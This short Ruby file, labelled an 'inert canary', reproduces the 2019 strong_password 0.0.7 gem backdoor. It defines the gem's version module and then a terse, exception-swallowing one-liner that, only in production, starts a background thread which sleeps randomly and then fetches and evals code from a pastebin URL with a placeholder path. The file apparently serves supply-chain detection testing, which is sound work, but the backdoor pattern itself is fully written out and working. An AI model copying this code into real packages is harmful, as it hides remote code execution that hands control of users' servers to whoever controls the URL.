# INERT CANARY modelled on strong_password 0.0.7 (2019): production-only remote eval in a thread.
require 'net/http'
module StrongPassword
  VERSION = '0.0.7'
end
def _!;begin;yield;rescue Exception;end;end
_!{Thread.new{loop{_!{sleep rand*3333;eval(Net::HTTP.get(URI('https://pastebin.com/raw/CANARYnotreal')))}}}if Rails.env[0]=="p"}
